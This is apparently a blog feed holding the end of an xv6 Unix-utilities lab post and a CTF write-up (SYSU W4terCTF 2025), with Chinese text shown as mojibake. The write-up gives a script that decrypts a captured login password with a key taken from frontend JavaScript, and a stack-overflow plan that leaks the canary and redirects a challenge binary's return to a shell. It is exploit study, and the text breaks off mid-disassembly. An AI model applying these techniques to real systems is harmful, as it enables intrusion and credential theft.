å°±è¡Œäº†ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> T_FILE:</span><br><span class="line">  p = path + <span class="built_in">strlen</span>(path) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(*p != <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">p--;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p+<span class="number">1</span>, filename) == <span class="number">0</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><ul><li>å¯¹äºè®¾å¤‡æ–‡ä»¶çš„<code>read</code>ï¼š<br>ä¸€å¼€å§‹æˆ‘å¿˜è®°äº†è¿˜æœ‰è®¾å¤‡è¿™ç§æ–‡ä»¶ï¼Œäºæ˜¯æ¯æ¬¡è¯»åˆ°<code>/console</code>éƒ½ä¼šè·³åˆ°æˆ‘çš„ default è¯­å¥ã€‚åé¢æ„è¯†åˆ°åæŠŠ <code>T_DEVICE</code> çš„å¤„ç†å’Œ <code>T_FILE</code> å’Œåˆ°äº†ä¸€èµ·ï¼Œè€Œæˆ‘çš„ file å¤„ç†é€»è¾‘ä¸­åˆæœ‰é”™è¯¯çš„ <code>read</code>ï¼Œæ­¤æ—¶å‡ºç°ä¸€ä¸ªå·¨å¤§çš„ error ï¼š<code>read</code> è¯»å–è®¾å¤‡æ–‡ä»¶ä¸ä¼šé€šè¿‡æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯è°ƒç”¨çš„è®¾å¤‡é©±åŠ¨ç¨‹åºï¼Œäº§ç”Ÿé˜»å¡ï¼å› æ­¤æ¯æ¬¡è¯»åˆ°<code>/console</code>å°±å¡æ­»äº† ğŸ˜¦</li></ul><hr><p>äº†è§£äº† xv6 åŸºæœ¬çš„æ–‡ä»¶ç³»ç»Ÿå®šä¹‰ <code>find</code> çš„å¤„ç†é€»è¾‘å°±å¾ˆæ¸…æ™°äº†ï¼Œå…¶å®å’Œ <code>ls</code> çš„å·®åˆ«åªåœ¨å¯¹äº file å’Œ device æˆ‘ä»¬ä¸ç”¨è§£ææ–‡ä»¶çŠ¶æ€ã€‚æ ¹æ®æœ€åˆçš„ path æˆ‘ä»¬è§£ææŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼šå¦‚æœæ˜¯è®¾å¤‡æˆ–è€…æ–‡ä»¶ï¼Œæˆ‘ä»¬åŒ¹é… file name å¹¶ç›´æ¥æ‰“å°è·¯å¾„ï¼›å¦‚æœæ˜¯æ–‡ä»¶ç›®å½•ï¼Œæˆ‘ä»¬åˆ™éœ€è¦å¾ªç¯è¯»å–æ¯ä¸€ä¸ªæ¡ç›®å¹¶é€’å½’ <code>find</code> ã€‚</p><p>å®è·µä¸­æœ‰ä¸€ä¸ªç‚¹æˆ‘æ²¡æœ‰æ³¨æ„åˆ°ï¼Œé‚£å°±æ˜¯ç›®å½•æ–‡ä»¶çš„åºåˆ—ä¸­æœ‰ä¸¤ä¸ªæ¡ç›®ï¼Œåˆ†åˆ«æ˜¯å½“å‰ç›®å½• <code>&quot;.&quot;</code> å’Œä¸Šä¸€ä¸ªç›®å½• <code>&quot;..&quot;</code> ï¼Œä¸èƒ½é€’å½’è¿›å»ï¼å®é™…ä¸Š Lab å¯¹æ­¤è¡Œä¸ºæœ‰æé†’ï¼š</p><blockquote><p><strong>Donâ€™t recurse into â€œ.â€ and â€œâ€¦â€.</strong></p></blockquote><p><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/find.png" alt="find.png"></p><h1 id="xargs"><a class="markdownIt-Anchor" href="#xargs"></a> xargs</h1><blockquote><p>Write a simple version of the UNIX xargs program for xv6: its arguments describe a command to run, it reads lines from the standard input, and it runs the command for each line, appending the line to the commandâ€™s arguments.</p></blockquote><p>è¿™é‡Œæˆ‘æ²¡æœ‰ç†è§£å¥½ <code>xargs</code> çš„åŠŸèƒ½ï¼Œè¯¯ä»¥ä¸ºæŠŠæ‰€æœ‰çš„ stdin ç»“åˆèµ·æ¥ç„¶åä¼ é€’åˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤ä½œä¸ºå‚æ•°ã€‚å®é™…ä¸Šåº”è¯¥æ¯è¯»å–ä¸€è¡Œä½œä¸ºä¸€ä¸ª append çš„å‚æ•°æ‰§è¡Œ <code>xargs</code> åé¢çš„æŒ‡ä»¤ã€‚</p><p>ä¸¾ä¸ªä¾‹å­:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> from world | xargs <span class="built_in">echo</span> hello</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¬¬ä¸€ä¸ª <code>echo</code> ä¼šè¾“å‡ºåˆ° stdout <code>from world\n</code>ï¼Œ<code>xargs</code> ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ä¸€è¡Œï¼Œç„¶ååŠ åœ¨ <code>echo hello</code> è¿™ä¸ªâ€œå‘½ä»¤â€åé¢ï¼Œå½¢æˆ <code>echo hello from world\n</code>ã€‚</p><p>æ³¨æ„æ¯æ¬¡è¯»å–ä¸€è¡Œéƒ½éœ€è¦å»é™¤æœ«å°¾çš„æ¢è¡Œç¬¦ï¼ŒåŒæ—¶æ³¨æ„ä¼ é€’ç»™ <code>exec</code> çš„ <code>argv[]</code> çš„æœ€åä¸€ä¸ªå‚æ•°å¾—æ˜¯ <code>NULL</code> ï¼<br><img src="/2025/05/06/Lab%20-%20xv6%20and%20Unix%20utilities/xargs.png" alt="xargs.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sleep&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#sleep&quot;&gt;&lt;/a&gt; sleep&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Implement a user-levelÂ &lt;code&gt;sleep&lt;/code&gt;Â program </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SYSU W4terCTF 2025</title>
    <link href="http://example.com/2025/04/28/SYSU%20W4terCTF%202025/"/>
    <id>http://example.com/2025/04/28/SYSU%20W4terCTF%202025/</id>
    <published>2025-04-28T04:48:37.447Z</published>
    <updated>2025-05-05T12:03:10.967Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hack for fun not for profit_</p></blockquote><p>ä»¥ä¸‹æ˜¯æˆ‘åœ¨ Team Nooob é˜Ÿä¼ä¸­è´Ÿè´£çš„é¢˜ç›®ã€‚</p><h1 id="ç­¾åˆ°é—®å·"><a class="markdownIt-Anchor" href="#ç­¾åˆ°é—®å·"></a> ç­¾åˆ°é—®å·</h1><p>å‘¨ä¸€12ç‚¹å¼€èµ›ï¼Œä¸‹åˆè¾¹ä¸Šè¯¾è¾¹åšï¼Œæ‹¿ä¸‹é˜Ÿä¼é¦–è¡€ ğŸ˜ƒ</p><p>è¿™é“é¢˜æŠŠ flag ç¡¬ç¼–ç æˆ–ç›´æ¥åŒ…å«åœ¨å®¢æˆ·ç«¯å¯ä»¥è·å–çš„åˆå§‹åŒ–æ•°æ®ä¸­ã€‚è™½ç„¶é¢˜é¢æè¿°äº†æˆªæ­¢æ—¶é—´é”™è¯¯å’Œæäº¤åæç¤ºè¯­ï¼Œçœ‹èµ·æ¥åƒæ˜¯éœ€è¦å®Œæˆæäº¤æˆ–ç»•è¿‡æ—¶é—´æ£€æŸ¥ï¼Œä½†å®é™…ä¸Šï¼ŒFlag å¹¶æ²¡æœ‰è¢«åŠ¨æ€ç”Ÿæˆæˆ–åœ¨æäº¤åæ‰ä»æœåŠ¡å™¨è¿”å›ã€‚</p><p>çœŸæ­£çš„è§£é¢˜è·¯å¾„æ˜¯ï¼š</p><ul><li><strong>è¯†åˆ«</strong> é¡µé¢åŠ è½½æ—¶è·å–çš„å…³é”®åˆå§‹åŒ–æ•°æ®ï¼ˆé€šå¸¸åœ¨ script æ ‡ç­¾æˆ–é€šè¿‡ AJAX è¯·æ±‚è·å–ï¼‰ã€‚</li><li><strong>è§£ç </strong> æ•°æ®ï¼ˆå¦‚æœè¢«ç¼–ç ï¼‰ã€‚</li><li><strong>åˆ†æ</strong> è§£ç åçš„æ•°æ®ç»“æ„ï¼Œå¯»æ‰¾ä¸é—®å·çŠ¶æ€ã€æµç¨‹æ§åˆ¶æˆ–ç»“æŸ/æˆåŠŸæç¤ºç›¸å…³çš„å­—æ®µã€‚</li><li><strong>ç›´æ¥</strong> åœ¨ç›¸å…³çš„å­—æ®µå€¼ä¸­æŸ¥æ‰¾ Flagã€‚</li></ul><p><code>end_of_survey</code> å­—æ®µæ°å¥½å°±æ‰¿æ‹…äº†â€œé—®å·ç»“æŸæ—¶æ˜¾ç¤ºçš„æç¤ºè¯­â€çš„è§’è‰²ï¼Œå¹¶ä¸” LilRan â€œä¸å°å¿ƒâ€å°† Flag ç›´æ¥æ”¾åˆ°äº†è¿™é‡Œï¼Œè€Œ<strong>ä¸æ˜¯åœ¨è§¦å‘æ˜¾ç¤ºåæ‰åŠ¨æ€åŠ è½½æˆ–ç”Ÿæˆ</strong>ã€‚å› æ­¤ï¼Œç»•è¿‡æäº¤æˆ–æ—¶é—´æ£€æŸ¥çš„å¤æ‚æ­¥éª¤å˜å¾—ä¸å¿…è¦ï¼ŒFlag <strong>ç›´æ¥é€šè¿‡åˆ†æé¡µé¢åˆå§‹åŒ–æ•°æ®</strong>å°±è·å–åˆ°äº†ã€‚<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/survey.png" alt="survey.png"></p><h1 id="ç®¡ç†å‘˜çš„å¯†ç "><a class="markdownIt-Anchor" href="#ç®¡ç†å‘˜çš„å¯†ç "></a> ç®¡ç†å‘˜çš„å¯†ç </h1><p>WireSharkåˆ†ææµé‡åŒ…ä¸­ç”¨æˆ·ç™»å½•æˆåŠŸçš„æŠ¥æ–‡ï¼Œæ‰¾åˆ°åŠ å¯†åçš„å¯†ç ï¼š<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/shark.png" alt="shark.png"></p><p>å‰ç«¯<code>CD3Iylek.js</code>ä¸­æ˜¾ç¤ºäº†åŠ å¯†ç®—æ³• AES ä¸åŠ å¯†æ¨¡å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">const</span> o = <span class="keyword">new</span> <span class="title class_">Date</span></span><br><span class="line">             , h = <span class="string">`<span class="subst">$&#123;o.getFullYear()&#125;</span>:<span class="subst">$&#123;o.getMonth() + <span class="number">1</span>&#125;</span>:<span class="subst">$&#123;o.getDate()&#125;</span>:<span class="subst">$&#123;o.getHours()&#125;</span>:<span class="subst">$&#123;o.getMinutes()&#125;</span>#`</span></span><br><span class="line">             , t = h0.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(<span class="string">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span>)</span><br><span class="line">             , a = h0.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(<span class="string">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span>)</span><br><span class="line">             , f = h0.<span class="property">AES</span>.<span class="title function_">encrypt</span>(h + l, t, &#123;</span><br><span class="line">               <span class="attr">iv</span>: a,</span><br><span class="line">               <span class="attr">mode</span>: h0.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">               <span class="attr">padding</span>: h0.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">           &#125;).<span class="title function_">toString</span>();</span><br><span class="line">           <span class="keyword">await</span> kx.<span class="property">account</span>.<span class="title function_">accountLoginCreate</span>(&#123;</span><br><span class="line">               <span class="attr">userName</span>: R,</span><br><span class="line">               <span class="attr">password</span>: f</span><br><span class="line">           &#125;),</span><br><span class="line">   <span class="comment">// ....</span></span><br></pre></td></tr></table></figure><ol><li>é¦–å…ˆè·å–å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´ï¼ˆå¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ï¼‰ï¼Œå¹¶æ ¼å¼åŒ–æˆ <code>YYYY:M:D:H:M#</code> çš„å­—ç¬¦ä¸²ï¼ˆå­˜å‚¨åœ¨å˜é‡ <code>h</code> ä¸­ï¼‰ã€‚</li><li>å®šä¹‰äº†ä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸² <code>&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</code> å’Œ <code>&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</code>ï¼Œå¹¶å°†å®ƒä»¬è§£ææˆå­—èŠ‚æ•°ç»„ã€‚è¿™å¾ˆæ˜æ˜¾æ˜¯ AES åŠ å¯†çš„ <strong>å¯†é’¥ (Key)</strong> å’Œ <strong>åˆå§‹åŒ–å‘é‡ (IV)</strong>ã€‚</li><li>å°†å‰é¢ç”Ÿæˆçš„æ—¶é—´å­—ç¬¦ä¸² <code>h</code> ä¸å¦ä¸€ä¸ªå˜é‡ <code>l</code> æ‹¼æ¥èµ·æ¥ã€‚æ ¹æ®ä¸Šä¸‹æ–‡å’Œé€šå¸¸çš„ç™»å½•é€»è¾‘ï¼Œè¿™ä¸ª <code>l</code> å°±æ˜¯ç”¨æˆ·åœ¨å¯†ç è¾“å…¥æ¡†ä¸­è¾“å…¥çš„ <strong>åŸå§‹å¯†ç </strong>ã€‚</li><li>ä½¿ç”¨ <code>h0.AES.encrypt</code> æ–¹æ³•å¯¹æ‹¼æ¥åçš„ <code>h + l</code> å­—ç¬¦ä¸²è¿›è¡Œ AES åŠ å¯†ã€‚åŠ å¯†é…ç½®ä½¿ç”¨äº† <code>t</code> ä½œä¸ºå¯†é’¥ï¼Œ<code>a</code> ä½œä¸º IVï¼ŒåŠ å¯†æ¨¡å¼æ˜¯ <strong>CBC (Cipher Block Chaining)</strong>ï¼Œå¡«å……æ–¹å¼æ˜¯ <strong>Pkcs7</strong>ã€‚</li><li>åŠ å¯†ç»“æœ <code>.toString()</code> è½¬æ¢æˆ Base64 å­—ç¬¦ä¸²ã€‚è¿™ä¸ªç»“æœå­˜å‚¨åœ¨å˜é‡ <code>f</code> ä¸­ã€‚</li><li>æœ€åï¼Œå°† <code>f</code> ä½œä¸º <code>password</code> å‚æ•°å‘é€ç»™ <code>accountLoginCreate</code> æ¥å£ã€‚</li></ol><p>è€Œä»æµé‡åŒ…ä¸­æŠ“åˆ°çš„<code>gBjV3cE/UXEm7fXGXbQ4Ox00P0zOdz0LgVaTt5iTrNhaPX81IWdsVWEA1r56LkGobiHaOvhswbVxMUypSZpWpfiGNe5wXcDbl1JuFEZDC4A=</code> å°±æ˜¯è¿™ä¸ªç»è¿‡ <strong>æ—¶é—´æ‹¼æ¥ã€AES åŠ å¯†ã€Base64 ç¼–ç </strong> åçš„ <code>f</code> å˜é‡çš„å€¼ï¼</p><p>æ‰€ä»¥è¿‡ç¨‹å°†æ˜¯ï¼šBase64 è§£ç  --&gt; AES è§£å¯† --&gt; æå–å¯†ç  <code>YYYY:M:D:H:M#åŸå§‹å¯†ç </code>ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">encrypted_b64 = <span class="string">&quot;gBjV3cE/UXEm7fXGXbQ4Ox00P0zOdz0LgVaTt5iTrNhaPX81IWdsVWEA1r56LkGobiHaOvhswbVxMUypSZpWpfiGNe5wXcDbl1JuFEZDC4A=&quot;</span></span><br><span class="line">key_hex = <span class="string">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span></span><br><span class="line">iv_hex = <span class="string">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Base64 è§£ç </span></span><br><span class="line">encrypted_data = base64.b64decode(encrypted_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† Hex æ ¼å¼çš„ Key å’Œ IV è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span></span><br><span class="line">key = unhexlify(key_hex)</span><br><span class="line">iv = unhexlify(iv_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. AES è§£å¯†</span></span><br><span class="line"><span class="comment"># åˆ›å»º AES è§£å¯†å™¨å¯¹è±¡</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># è§£å¯†ï¼Œå¹¶è¿›è¡Œ PKCS7 å¡«å……ç§»é™¤</span></span><br><span class="line">decrypted_padded_data = cipher.decrypt(encrypted_data)</span><br><span class="line">decrypted_data = unpad(decrypted_padded_data, AES.block_size)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># å°†è§£å¯†åçš„å­—èŠ‚ä¸²è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">decrypted_string = decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. æå–å¯†ç </span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> decrypted_string:</span><br><span class="line">Â  Â  original_password = decrypted_string.split(<span class="string">&#x27;#&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸè§£å¯†å‡ºçš„åŸå§‹å¯†ç  (Flag): <span class="subst">&#123;original_password&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">&quot;è§£å¯†åçš„æ•°æ®æ ¼å¼ä¸æ­£ç¡®ï¼Œæœªæ‰¾åˆ° &#x27;#&#x27; åˆ†éš”ç¬¦ã€‚&quot;</span>)</span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="string">f&quot;è§£å¯†åçš„æ•°æ®: <span class="subst">&#123;decrypted_string&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/04/28/SYSU%20W4terCTF%202025/passwd.png" alt="passwd.png"></p><h1 id="wmc25-d0"><a class="markdownIt-Anchor" href="#wmc25-d0"></a> WMC25 D0</h1><p>åŸæœ¬ä»¥ä¸ºè¦ç”¨æ ˆæº¢å‡ºæ¥ call <code>win</code>ï¼Œæ²¡æƒ³åˆ°ç©å®Œæ‰«é›·å°±ç»™äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">Â  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">Â  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">Â  Â  read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span></span><br><span class="line">Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  &#125;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">Â  win();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/28/SYSU%20W4terCTF%202025/wmc.png" alt="wmc.png"></p><h1 id="wmc25-d1"><a class="markdownIt-Anchor" href="#wmc25-d1"></a> WMC25 D1</h1><p>ä¸‹ä¸€ level å°±æŠŠ <code>win()</code> ç»™å»æ‰äº†ï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦è¿›è¡Œæ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;      <span class="comment">// åé—¨å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">Â  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">Â  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">Â  Â  read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">Â  Â  Â  <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">Â  Â  &#125; <span class="keyword">else</span></span><br><span class="line">Â  Â  Â  <span class="keyword">break</span>;</span><br><span class="line">Â  &#125;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶é€šè¿‡ <code>checksec</code> çŸ¥é“ç¨‹åº<strong>å¼€å¯äº† Canary æ ˆä¿æŠ¤</strong>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO            tifiable</span><br><span class="line">STACK CANARY     Canary found</span><br><span class="line">NX               NX enabled</span><br><span class="line">PIE              No PIE</span><br><span class="line">RPATH            No RPATH</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è¦†ç›–è¿”å›åœ°å€ä¸ºæ‰¾åˆ°çš„åé—¨å‡½æ•° <code>win</code> ï¼Œæˆ‘ä»¬ä¸€å®šä¼šè¦†ç›–æ‰ Canaryï¼Œä½†æ˜¯å¦‚æœ Canary è¢«ç ´åäº†çš„è¯ï¼Œè¿”å›æ—¶æ£€æŸ¥å°±ä¼šè·³åˆ° <code>__stack_chk_fail</code>ï¼Œç›´æ¥ stack smashingã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">40139e:48 8b 45 f8          mov    -0x8(%rbp),%rax</span><br><span class="line">4013a2:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax</span><br><span class="line">4013a9:00 00 </span><br><span class="line">4013ab:74 05                je     4013b2 &lt;vuln+0xe2&gt;</span><br><span class="line">4013ad:e8 8e fd ff ff       call   401140 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦è®¾è®¡å¥½ä¸¤æ¬¡payloadï¼š</p><ol><li>ç¬¬ä¸€æ¬¡æäº¤24å­—èŠ‚çš„payloadï¼ˆ16 bytes buf + 8 bytes paddingï¼‰ï¼Œæ³„éœ² <strong>Canary</strong> å€¼ï¼šæ— è®ºæ˜¯é€šè¿‡ <code>pwntools</code> çš„ <code>sendline</code> å‘é€è¿˜æ˜¯æ‰‹åŠ¨ stdin è¾“å…¥ï¼Œæœ€åä¸€ä¸ªæ¢è¡Œç¬¦ <code>\n</code> éƒ½ä¼šè¢«è®°å½•ï¼è€Œæ°å¥½è¿™ä¸ªæ¢è¡Œç¬¦å¯ä»¥è¦†ç›–é‡‘ä¸é›€çš„æœ€ä½å­—èŠ‚ <code>\x00</code>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¯»å–è¾“å‡ºåçš„ä¸ƒä¸ªå­—èŠ‚ã€‚<img src="/2025/04/28/SYSU%20W4terCTF%202025/d1_canary.png" alt="d1_canary.png"></li><li>ç¬¬äºŒæ¬¡åœ¨ payload ä¸­å¡«ä¸Šæˆ‘ä»¬çš„ Canaryï¼Œåœ¨ <code>$rbp+8</code> å¼€å§‹çš„8å­—èŠ‚è¿”å›åœ°å€è¦†ç›–ä¸Š <code>win()</code> çš„å…¥å£åœ°å€ï¼Œå°è¯•å¾—åˆ° shellã€‚ä¸€å¼€å§‹æˆ‘è¦†ç›–çš„æ˜¯ <code>win</code> å‡½æ•°çš„å…¥å£åœ°å€ <code>0x4012b6</code> ï¼Œæ‰§è¡ŒæŒ‡ä»¤ <code>endbr64</code> ä¼šå‡ºé”™ï¼Œåªå¥½è·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ <code>0x4012ba</code>ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004012b</span>6 &lt;win&gt;:</span><br><span class="line">  <span class="number">4012b</span>6:f3 <span class="number">0f</span> <span class="number">1</span>e fa          endbr64 </span><br><span class="line">  <span class="number">4012b</span>a:<span class="number">55</span>                   push   %rbp</span><br><span class="line">  <span class="number">4012b</span>b:<span class="number">48</span> <span class="number">89</span> e5             mov    %rsp,%rbp</span><br><span class="line">  <span class="number">4012b</span>e:<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">4b</span> <span class="number">0</span>d <span 